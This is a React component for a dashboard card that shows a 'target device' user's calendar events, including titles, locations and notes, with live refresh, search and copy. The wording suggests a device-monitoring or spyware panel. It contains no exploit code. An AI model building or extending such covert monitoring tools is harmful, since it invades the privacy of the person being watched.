import { useEffect, useMemo, useRef, useState } from "react";
import { devicesApi } from "../api/devices";
import { apiClient } from "../api/client";
import type { CalendarEvent } from "../api/types";

const SCROLL_CLASS = "max-h-96 overflow-y-auto";
const AUTO_REFRESH_MS = 15000;

export default function CalendarCard({ deviceId }: { deviceId: string }) {
  const [events, setEvents] = useState<CalendarEvent[]>([]);
  const [loading, setLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);
  const [search, setSearch] = useState("");
  const [filter, setFilter] = useState<"all" | "upcoming" | "past">("all");
  const [selectedEvent, setSelectedEvent] = useState<CalendarEvent | null>(null);
  const [copied, setCopied] = useState(false);
  const [lastUpdated, setLastUpdated] = useState<Date>(new Date());

  const loadRef = useRef<() => void>(() => {});

  const load = () => {
    setRefreshing(true);
    devicesApi
      .calendarEvents(deviceId)
      .then((data) => {
        setEvents(data);
        setLastUpdated(new Date());
      })
      .catch((err) => {
        console.warn("Failed to load calendar events:", err);
      })
      .finally(() => {
        setLoading(false);
        setRefreshing(false);
      });
  };

  loadRef.current = load;

  // Initial load and periodic refresh
  useEffect(() => {
    load();
    const interval = setInterval(() => loadRef.current(), AUTO_REFRESH_MS);
    return () => clearInterval(interval);
  }, [deviceId]);

  // Real-time SSE listener
  useEffect(() => {
    let eventSource: EventSource | null = null;
    try {
      const token = localStorage.getItem("spapp_token") || "";
      const baseApi = apiClient.defaults.baseURL || "http://localhost:4000";
      const sseUrl = `${baseApi}/api/devices/${deviceId}/events?token=${encodeURIComponent(token)}`;
      eventSource = new EventSource(sseUrl);

      eventSource.onmessage = (event) => {
        try {
          const payload = JSON.parse(event.data);
          if (
            payload.type === "calendar_events" ||
            payload.type === "sync" ||
            payload.type === "new_data"
          ) {
            loadRef.current();
          }
        } catch (_) {}
      };
      eventSource.onerror = () => {};
    } catch (err) {
      console.warn("Real-time SSE subscription error in CalendarCard:", err);
    }

    return () => {
      if (eventSource) {
        eventSource.close();
      }
    };
  }, [deviceId]);

  // Modal keyboard listener
  useEffect(() => {
    function handleKeyDown(e: KeyboardEvent) {
      if (e.key === "Escape") {
        setSelectedEvent(null);
      }
    }
    if (selectedEvent) {
      window.addEventListener("keydown", handleKeyDown);
      return () => window.removeEventListener("keydown", handleKeyDown);
    }
  }, [selectedEvent]);

  function handleCopy(text: string) {
    if (text) {
      navigator.clipboard.writeText(text);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  }

  // Format date helper
  function formatEventDate(isoStr: string) {
    try {
      const date = new Date(isoStr);
      if (isNaN(date.getTime())) return isoStr;
      return date.toLocaleDateString("en-US", {
        weekday: "short",
        year: "numeric",
        month: "short",
        day: "numeric",
      });
    } catch {
      return isoStr;
    }
  }

  // Format time helper
  function formatEventTime(startIso: string, endIso: string | null, isAllDay: boolean) {
    if (isAllDay) return "All Day";
    try {
      const start = new Date(startIso);
      const startTimeStr = start.toLocaleTimeString("en-US", {
        hour: "numeric",
        minute: "2-digit",
        hour12: true,
      });

      if (!endIso) return startTimeStr;
      const end = new Date(endIso);
      if (isNaN(end.getTime())) return startTimeStr;

      const endTimeStr = end.toLocaleTimeString("en-US", {
        hour: "numeric",
        minute: "2-digit",
        hour12: true,
      });
      return `${startTimeStr} - ${endTimeStr}`;
    } catch {
      return "All Day";
    }
  }

  // Timeline badge (Upcoming, Today, Past)
  function getTimelineBadge(startIso: string) {
    try {
      const now = new Date();
      const start = new Date(startIso);
      const todayStart = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime();
      const eventDayStart = new Date(start.getFullYear(), start.getMonth(), start.getDate()).getTime();
      const dayDiff = Math.round((eventDayStart - todayStart) / (24 * 60 * 60 * 1000));

      if (dayDiff === 0) {
        return (
          <span className="inline-flex items-center px-2 py-0.5 rounded text-xs font-medium bg-emerald-950/80 text-emerald-400 border border-emerald-800/60 shadow-sm">
            <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 mr-1.5 animate-pulse"></span>
            Today
          </span>
        );
      } else if (dayDiff === 1) {
        return (
          <span className="inline-flex items-center px-2 py-0.5 rounded text-xs font-medium bg-cyan-950/80 text-cyan-400 border border-cyan-800/60 shadow-sm">
            Tomorrow
          </span>
        );
      } else if (dayDiff > 1) {
        return (
          <span className="inline-flex items-center px-2 py-0.5 rounded text-xs font-medium bg-indigo-950/80 text-indigo-400 border border-indigo-800/60 shadow-sm">
            In {dayDiff}d
          </span>
        );
      } else {
        return (
          <span className="inline-flex items-center px-2 py-0.5 rounded text-xs font-medium bg-slate-800/80 text-slate-400 border border-slate-700/60 shadow-sm">
            Past
          </span>
        );
      }
    } catch {
      return null;
    }
  }

  // Filter and search
  const filteredEvents = useMemo(() => {
    const nowTime = Date.now();
    return events.filter((ev) => {
      // Filter by timeline status
      if (filter === "upcoming") {
        const evTime = new Date(ev.start_time).getTime();
        if (evTime < nowTime - 24 * 60 * 60 * 1000) return false;
      } else if (filter === "past") {
        const evTime = new Date(ev.start_time).getTime();
        if (evTime >= nowTime) return false;
      }

      // Search query
      if (search.trim()) {
        const q = search.toLowerCase().trim();
        const titleMatch = ev.title.toLowerCase().includes(q);
        const descMatch = (ev.description || "").toLowerCase().includes(q);
        const locMatch = (ev.location || "").toLowerCase().includes(q);
        const dateMatch = formatEventDate(ev.start_time).toLowerCase().includes(q);
        return titleMatch || descMatch || locMatch || dateMatch;
      }

      return true;
    });
  }, [events, filter, search]);

  return (
    <div className="bg-slate-900/90 border border-slate-800/80 rounded-xl p-5 shadow-xl backdrop-blur relative overflow-hidden">
      {/* Top ambient glow */}
      <div className="absolute top-0 right-0 w-80 h-32 bg-amber-500/5 rounded-full blur-3xl pointer-events-none" />

      {/* Header bar */}
      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4 pb-4 border-b border-slate-800/80">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-lg bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 shadow-inner">
            <svg
              className="w-5 h-5"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"
              />
            </svg>
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h2 className="text-base font-semibold text-white tracking-wide">Calendar Events</h2>
              <span className="text-xs px-2 py-0.5 rounded-full bg-amber-500/15 text-amber-300 border border-amber-500/30 font-medium">
                {events.length} Marked
              </span>
            </div>
            <p className="text-xs text-slate-400 mt-0.5">
              Dates, events, and notes marked on target device calendar
            </p>
          </div>
        </div>

        {/* Right action controls */}
        <div className="flex items-center flex-wrap gap-2.5">
          {/* Quick timeline filter */}
          <div className="inline-flex rounded-lg p-0.5 bg-slate-800/80 border border-slate-700/60 text-xs">
            <button
              onClick={() => setFilter("all")}
              className={`px-2.5 py-1 rounded-md font-medium transition-colors ${
                filter === "all"
                  ? "bg-amber-500/20 text-amber-300 font-semibold"
                  : "text-slate-400 hover:text-slate-200"
              }`}
            >
              All
            </button>
            <button
              onClick={() => setFilter("upcoming")}
              className={`px-2.5 py-1 rounded-md font-medium transition-colors ${
                filter === "upcoming"
                  ? "bg-amber-500/20 text-amber-300 font-semibold"
                  : "text-slate-400 hover:text-slate-200"
              }`}
            >
              Upcoming
            </button>
            <button
              onClick={() => setFilter("past")}
              className={`px-2.5 py-1 rounded-md font-medium transition-colors ${
                filter === "past"
                  ? "bg-amber-500/20 text-amber-300 font-semibold"
                  : "text-slate-400 hover:text-slate-200"
              }`}
            >
              Past
            </button>
          </div>

          {/* Search bar */}
          <div className="relative">
            <svg
              className="w-3.5 h-3.5 text-slate-400 absolute left-2.5 top-1/2 -translate-y-1/2 pointer-events-none"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
              />
            </svg>
            <input
              type="text"
              placeholder="Search event, date, content..."
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              className="w-48 sm:w-56 pl-8 pr-3 py-1.5 text-xs rounded-lg bg-slate-800/80 border border-slate-700/80 text-white placeholder-slate-400 focus:outline-none focus:border-amber-500/50 focus:ring-1 focus:ring-amber-500/50 transition-all"
            />
            {search && (
              <button
                onClick={() => setSearch("")}
                className="absolute right-2 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-200 text-xs"
              >
                ✕
              </button>
            )}
          </div>

          {/* Refresh button */}
          <button
            onClick={load}
            disabled={refreshing}
            title="Refresh calendar events"
            className="p-1.5 text-slate-400 hover:text-white rounded-lg bg-slate-800/80 hover:bg-slate-700/80 border border-slate-700/80 transition-all disabled:opacity-50"
          >
            <svg
              className={`w-4 h-4 ${refreshing ? "animate-spin text-amber-400" : ""}`}
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"
              />
            </svg>
          </button>
        </div>
      </div>

      {/* Main Content Area */}
      <div className="mt-4">
        {loading ? (
          <div className="py-12 flex flex-col items-center justify-center text-slate-400">
            <svg className="w-6 h-6 animate-spin text-amber-400 mb-2" fill="none" viewBox="0 0 24 24">
              <circle
                className="opacity-25"
                cx="12"
                cy="12"
                r="10"
                stroke="currentColor"
                strokeWidth="4"
              ></circle>
              <path
                className="opacity-75"
                fill="currentColor"
                d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
              ></path>
            </svg>
            <span className="text-xs">Loading calendar events...</span>
          </div>
        ) : filteredEvents.length === 0 ? (
          <div className="py-12 flex flex-col items-center justify-center text-center">
            <div className="w-12 h-12 rounded-full bg-slate-800/80 border border-slate-700/80 flex items-center justify-center text-slate-500 mb-3">
              <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={1.5}
                  d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"
                />
              </svg>
            </div>
            <p className="text-sm font-medium text-slate-300">
              {search ? "No matching calendar events" : "No calendar events marked on device"}
            </p>
            <p className="text-xs text-slate-500 mt-1 max-w-sm">
              {search
                ? `No event matched "${search}". Try searching for another keyword or clear filter.`
                : "When the target device user adds or marks events on their calendar, they will automatically appear here in real time."}
            </p>
          </div>
        ) : (
          <div className={SCROLL_CLASS}>
            <table className="w-full text-left text-xs border-collapse">
              <thead>
                <tr className="border-b border-slate-800 text-slate-400 uppercase tracking-wider text-[11px] bg-slate-900/60 sticky top-0 backdrop-blur z-10">
                  <th className="py-2.5 px-3 font-semibold w-48">Date & Time</th>
                  <th className="py-2.5 px-3 font-semibold w-64">Event</th>
                  <th className="py-2.5 px-3 font-semibold">Event Content / Notes</th>
                  <th className="py-2.5 px-3 font-semibold w-24 text-right">Action</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-800/60">
                {filteredEvents.map((ev) => {
                  const dateStr = formatEventDate(ev.start_time);
                  const timeStr = formatEventTime(ev.start_time, ev.end_time, ev.is_all_day);
                  const timelineBadge = getTimelineBadge(ev.start_time);

                  return (
                    <tr
                      key={ev.id || ev.external_id}
                      onClick={() => setSelectedEvent(ev)}
                      className="hover:bg-slate-800/50 transition-colors cursor-pointer group"
                    >
                      {/* Date & Time Column */}
                      <td className="py-3 px-3 align-top whitespace-nowrap">
                        <div className="font-medium text-white">{dateStr}</div>
                        <div className="flex items-center gap-1.5 mt-1">
                          <span className="text-[11px] text-slate-400 font-mono">{timeStr}</span>
                          {timelineBadge}
                        </div>
                      </td>

                      {/* Event Column */}
                      <td className="py-3 px-3 align-top">
                        <div className="font-semibold text-slate-100 group-hover:text-amber-300 transition-colors flex items-center gap-1.5">
                          <span>{ev.title}</span>
                          {ev.is_all_day && (
                            <span className="text-[10px] px-1.5 py-0.2 rounded bg-purple-950/70 text-purple-300 border border-purple-800/50">
                              All Day
                            </span>
                          )}
                        </div>

                        {ev.location && (
                          <div className="mt-1 flex items-center gap-1 text-[11px] text-slate-400">
                            <svg
                              className="w-3 h-3 text-amber-400/80 shrink-0"
                              fill="none"
                              stroke="currentColor"
                              viewBox="0 0 24 24"
                            >
                              <path
                                strokeLinecap="round"
                                strokeLinejoin="round"
                                strokeWidth={2}
                                d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"
                              />
                              <path
                                strokeLinecap="round"
                                strokeLinejoin="round"
                                strokeWidth={2}
                                d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"
                              />
                            </svg>
                            <span className="truncate max-w-[200px]" title={ev.location}>
                              {ev.location}
                            </span>
                          </div>
                        )}
                      </td>

                      {/* Event Content / Notes Column */}
                      <td className="py-3 px-3 align-top">
                        {ev.description ? (
                          <p
                            className="text-slate-300 text-xs line-clamp-2 max-w-xl whitespace-pre-line leading-relaxed"
                            title={ev.description}
                          >
                            {ev.description}
                          </p>
                        ) : (
                          <span className="text-slate-500 italic text-xs">No notes provided</span>
                        )}
                      </td>

                      {/* Action Column */}
                      <td className="py-3 px-3 align-top text-right whitespace-nowrap">
                        <button
                          onClick={(e) => {
                            e.stopPropagation();
                            setSelectedEvent(ev);
                          }}
                          className="px-2.5 py-1 text-xs rounded bg-slate-800 hover:bg-amber-500/20 text-slate-300 hover:text-amber-300 border border-slate-700/80 hover:border-amber-500/40 transition-all font-medium inline-flex items-center gap-1"
                        >
                          View
                          <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path
                              strokeLinecap="round"
                              strokeLinejoin="round"
                              strokeWidth={2}
                              d="M9 5l7 7-7 7"
                            />
                          </svg>
                        </button>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        )}
      </div>

      {/* Footer Info */}
      <div className="mt-3 pt-3 border-t border-slate-800/80 flex items-center justify-between text-[11px] text-slate-400">
        <div className="flex items-center gap-2">
          <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
          <span>Target device calendar observed in real-time</span>
        </div>
        <div>
          Last updated: {lastUpdated.toLocaleTimeString()}
        </div>
      </div>

      {/* Detail Modal */}
      {selectedEvent && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/75 backdrop-blur-sm animate-fade-in"
          onClick={() => setSelectedEvent(null)}
        >
          <div
            className="bg-slate-900 border border-slate-700 rounded-xl max-w-lg w-full p-6 shadow-2xl relative text-slate-200"
            onClick={(e) => e.stopPropagation()}
          >
            {/* Header */}
            <div className="flex items-start justify-between gap-4 pb-4 border-b border-slate-800">
              <div className="flex items-center gap-3">
                <div className="w-9 h-9 rounded-lg bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 shrink-0">
                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"
                    />
                  </svg>
                </div>
                <div>
                  <h3 className="text-base font-semibold text-white leading-snug">
                    {selectedEvent.title}
                  </h3>
                  <div className="flex items-center gap-2 mt-1">
                    <span className="text-xs text-amber-400/90 font-medium">
                      {formatEventDate(selectedEvent.start_time)}
                    </span>
                    <span className="text-xs text-slate-400">•</span>
                    <span className="text-xs text-slate-400">
                      {formatEventTime(
                        selectedEvent.start_time,
                        selectedEvent.end_time,
                        selectedEvent.is_all_day
                      )}
                    </span>
                  </div>
                </div>
              </div>
              <button
                onClick={() => setSelectedEvent(null)}
                className="text-slate-400 hover:text-white p-1 rounded-lg hover:bg-slate-800 transition-colors"
              >
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>

            {/* Event Details Body */}
            <div className="mt-4 space-y-4">
              {/* Timeline Status */}
              <div className="flex items-center justify-between text-xs bg-slate-800/50 px-3 py-2 rounded-lg border border-slate-700/50">
                <span className="text-slate-400">Status</span>
                <div className="flex items-center gap-2">
                  {selectedEvent.is_all_day && (
                    <span className="px-2 py-0.5 rounded text-[11px] font-medium bg-purple-950/70 text-purple-300 border border-purple-800/50">
                      All Day Event
                    </span>
                  )}
                  {getTimelineBadge(selectedEvent.start_time)}
                </div>
              </div>

              {/* Location (if present) */}
              {selectedEvent.location && (
                <div className="text-xs bg-slate-800/50 px-3 py-2 rounded-lg border border-slate-700/50">
                  <span className="text-slate-400 block mb-1">Location</span>
                  <div className="flex items-center justify-between gap-2">
                    <span className="text-slate-200 font-medium flex items-center gap-1.5">
                      <span className="text-amber-400">📍</span>
                      {selectedEvent.location}
                    </span>
                    <button
                      onClick={() => handleCopy(selectedEvent.location || "")}
                      className="text-slate-400 hover:text-amber-300 text-[11px] underline"
                    >
                      Copy
                    </button>
                  </div>
                </div>
              )}

              {/* Event Content / Notes */}
              <div>
                <div className="flex items-center justify-between mb-1.5">
                  <span className="text-xs font-semibold text-slate-300 uppercase tracking-wide">
                    Event Content / Notes
                  </span>
                  {selectedEvent.description && (
                    <button
                      onClick={() => handleCopy(selectedEvent.description || "")}
                      className="text-xs text-amber-400 hover:text-amber-300 flex items-center gap-1 font-medium"
                    >
                      {copied ? (
                        <>
                          <svg className="w-3.5 h-3.5 text-emerald-400" viewBox="0 0 20 20" fill="currentColor">
                            <path
                              fillRule="evenodd"
                              d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                              clipRule="evenodd"
                            />
                          </svg>
                          <span className="text-emerald-400">Copied!</span>
                        </>
                      ) : (
                        <>
                          <svg className="w-3.5 h-3.5" viewBox="0 0 20 20" fill="currentColor">
                            <path d="M8 3a1 1 0 011-1h2a1 1 0 110 2H9a1 1 0 01-1-1z" />
                            <path d="M6 3a2 2 0 00-2 2v11a2 2 0 002 2h8a2 2 0 002-2V5a2 2 0 00-2-2 3 3 0 01-3 3H9a3 3 0 01-3-3z" />
                          </svg>
                          <span>Copy content</span>
                        </>
                      )}
                    </button>
                  )}
                </div>
                <div className="bg-slate-950/80 p-3.5 rounded-lg border border-slate-800 text-xs text-slate-200 whitespace-pre-wrap leading-relaxed max-h-48 overflow-y-auto select-text font-mono">
                  {selectedEvent.description || "No description or notes provided for this event."}
                </div>
              </div>

              {/* Timestamp metadata */}
              <div className="text-[11px] text-slate-400 flex items-center justify-between pt-2 border-t border-slate-800/80">
                <span>Event ID: {selectedEvent.external_id}</span>
                <span>
                  Synced:{" "}
                  {selectedEvent.synced_at
                    ? new Date(selectedEvent.synced_at).toLocaleString()
                    : "Live"}
                </span>
              </div>
            </div>

            {/* Footer Buttons */}
            <div className="mt-5 flex justify-end">
              <button
                onClick={() => setSelectedEvent(null)}
                className="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-white rounded-lg text-xs font-medium transition-colors"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
